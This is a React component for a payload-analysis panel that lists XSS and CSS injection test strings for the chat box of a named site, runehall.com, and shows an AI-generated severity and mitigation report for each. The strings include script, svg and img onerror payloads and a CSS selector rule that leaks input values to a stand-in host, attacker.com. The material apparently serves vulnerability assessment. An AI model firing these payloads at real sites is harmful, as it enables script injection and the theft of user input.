import React, { useState } from 'react';
import { MessageSquare, ShieldAlert, Code, AlertCircle, Loader2, Send, Download } from 'lucide-react';
import { analyzeVulnerability } from '../lib/gemini';

const TEST_VECTORS = [
  { name: 'Basic XSS', payload: '<script>alert(1)</script>', type: 'XSS' },
  { name: 'SVG XSS', payload: '<svg onload=alert(1)>', type: 'XSS' },
  { name: 'CSS Injection', payload: 'body { background: url("javascript:alert(1)") }', type: 'CSS' },
  { name: 'Iframe Injection', payload: '<iframe src="javascript:alert(1)"></iframe>', type: 'XSS' },
  { name: 'Event Handler XSS', payload: '<img src=x onerror=alert(1)>', type: 'XSS' },
  { name: 'CSS Exfiltration', payload: 'input[value^="a"] { background: url("https://attacker.com/a") }', type: 'CSS' },
];

export function SecurityModule() {
  const [loading, setLoading] = useState(false);
  const [analysis, setAnalysis] = useState<any>(null);
  const [customPayload, setCustomPayload] = useState('');

  const runAnalysis = async (payload: string) => {
    setLoading(true);
    const results = await analyzeVulnerability(payload, 'Chat Box Input');
    setAnalysis({ ...results, raw_payload: payload });
    setLoading(false);
  };

  const handleExport = () => {
    if (!analysis) return;

    const headers = ["Vulnerability Type", "Severity", "Impact", "Mitigation", "Payload"];
    const row = [
      analysis.vulnerability_type || 'N/A',
      analysis.severity || 'N/A',
      `"${(analysis.potential_impact || 'N/A').replace(/"/g, '""')}"`,
      `"${(analysis.mitigation_strategy || 'N/A').replace(/"/g, '""')}"`,
      `"${(analysis.raw_payload || 'N/A').replace(/"/g, '""')}"`
    ];

    const csvContent = "data:text/csv;charset=utf-8," 
      + headers.join(",") + "\n"
      + row.join(",");

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `security_analysis_${new Date().toISOString().split('T')[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center border-b border-ink pb-4">
        <div>
          <h2 className="text-xl font-bold tracking-tight uppercase italic serif">CHAT BOX VULNERABILITY TESTING</h2>
          <p className="text-xs opacity-60">Testing CSS and XSS potential for runehall.com chat modules</p>
        </div>
        <div className="flex items-center gap-4">
          {analysis && !loading && (
            <button 
              onClick={handleExport}
              className="bg-bg border border-ink text-ink px-3 py-1.5 text-[10px] font-bold flex items-center gap-2 hover:bg-ink hover:text-bg transition-colors"
            >
              <Download className="w-3 h-3" />
              EXPORT CSV
            </button>
          )}
          <ShieldAlert className="w-8 h-8 text-red-600" />
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Test Vectors */}
        <div className="border border-ink p-6 bg-white shadow-sm">
          <div className="flex items-center gap-2 mb-4">
            <Code className="w-5 h-5" />
            <h3 className="col-header">Standard Test Vectors</h3>
          </div>
          <div className="space-y-2">
            {TEST_VECTORS.map((vector, i) => (
              <div 
                key={i} 
                className="data-row"
                onClick={() => runAnalysis(vector.payload)}
              >
                <span className="text-[10px] opacity-50">{String(i + 1).padStart(2, '0')}</span>
                <span className="data-value text-sm truncate">{vector.name}</span>
                <span className="text-[10px] uppercase opacity-50">{vector.type}</span>
                <Send className="w-3 h-3 justify-self-end opacity-20" />
              </div>
            ))}
          </div>

          <div className="mt-6">
            <h3 className="col-header mb-2">Custom Payload</h3>
            <div className="flex gap-2">
              <input 
                type="text" 
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                placeholder="Enter custom XSS/CSS payload..."
                className="flex-1 border border-ink p-2 text-xs font-mono bg-bg/20 focus:outline-none"
              />
              <button 
                onClick={() => runAnalysis(customPayload)}
                disabled={loading || !customPayload}
                className="bg-ink text-bg px-4 py-2 text-xs font-bold hover:opacity-90 disabled:opacity-50"
              >
                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : 'ANALYZE'}
              </button>
            </div>
          </div>
        </div>

        {/* Analysis Results */}
        <div className="border border-ink p-6 bg-white shadow-sm">
          <div className="flex items-center gap-2 mb-4">
            <AlertCircle className="w-5 h-5" />
            <h3 className="col-header">Vulnerability Analysis</h3>
          </div>
          
          {loading && (
            <div className="terminal-card">
              <p className="animate-pulse">Analyzing payload impact...</p>
              <p className="text-xs mt-2 opacity-70">Checking for sanitization bypass...</p>
              <p className="text-xs opacity-70">Evaluating browser execution context...</p>
            </div>
          )}

          {analysis && !loading && (
            <div className="space-y-4">
              <div className={`p-3 border-l-4 ${
                analysis.severity === 'Critical' ? 'bg-red-50 border-red-600' :
                analysis.severity === 'High' ? 'bg-orange-50 border-orange-600' :
                'bg-yellow-50 border-yellow-600'
              }`}>
                <p className="text-[10px] uppercase opacity-50">Severity: {analysis.severity}</p>
                <p className="font-bold text-sm">{analysis.vulnerability_type}</p>
              </div>

              <div>
                <h4 className="text-xs font-bold uppercase mb-1">Impact</h4>
                <p className="text-xs opacity-80 leading-relaxed">{analysis.potential_impact}</p>
              </div>

              <div>
                <h4 className="text-xs font-bold uppercase mb-1">Mitigation</h4>
                <p className="text-xs opacity-80 leading-relaxed">{analysis.mitigation_strategy}</p>
              </div>

              <div className="terminal-card mt-4">
                <p className="text-[10px] mb-2 border-b border-green-900/30 pb-1">PAYLOAD_SOURCE</p>
                <code className="text-xs break-all">{analysis.raw_payload || 'N/A'}</code>
              </div>
            </div>
          )}

          {!analysis && !loading && (
            <div className="flex flex-col items-center justify-center py-20 opacity-20">
              <MessageSquare className="w-16 h-16 mb-4" />
              <p className="font-mono text-sm uppercase tracking-widest">Select a vector to analyze</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
